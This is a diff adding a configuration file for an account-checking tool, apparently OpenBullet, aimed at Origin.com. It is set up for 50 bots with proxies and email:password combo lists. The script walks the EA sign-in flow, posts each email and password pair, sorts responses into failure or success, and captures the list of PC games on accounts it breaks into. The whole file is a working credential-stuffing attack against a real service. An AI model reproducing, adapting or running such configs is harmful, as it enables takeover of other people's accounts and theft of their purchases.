@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "Origin.com",
+  "SuggestedBots": 50,
+  "LastModified": "2018-11-05T21:39:34.1221415+00:00",
+  "AdditionalInfo": "",
+  "Author": "PaparazziTeam",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#URL1 REQUEST GET "https://signin.ea.com/p/originX/login?execution=e879570719s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fresponse_type%3Dcode%26client_id%3DORIGIN_SPA_ID%26display%3DoriginXWeb%252Flogin%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Cookie PARSE "<HEADERS(Cookie)>" LR "" "" Recursive=FALSE -> VAR "Cookies" "" "" 
+#URL2 REQUEST GET "https://accounts.ea.com/connect/auth?response_type=code&client_id=ORIGIN_SPA_ID&display=originXWeb%2Flogin&locale=en_US&redirect_uri=https%3A%2F%2Fwww.origin.com%2Fviews%2Flogin.html" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Location1 PARSE "<HEADERS(Location)>" LR "" "" Recursive=FALSE -> VAR "Location1" "" "" 
+#URL3 REQUEST GET "<Location1>" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Location2 PARSE "<HEADERS(Location)>" LR "" "" Recursive=FALSE -> VAR "Location2" "" "" 
+#URL4 REQUEST POST "https://signin.ea.com<Location2>" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&_eventId=submit&cid=&showAgeUp=true&googleCaptchaResponse=&_rememberMe=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Your credentials are incorrect or have expired. Please try again or reset your password." 
+  KEYCHAIN Success OR 
+    KEY "pc-content-login" 
+#Games PARSE "<SOURCE>" LR "" "" Recursive=FALSE -> CAP "Games" "class=\"origin-filter-link\">PC" "<" 
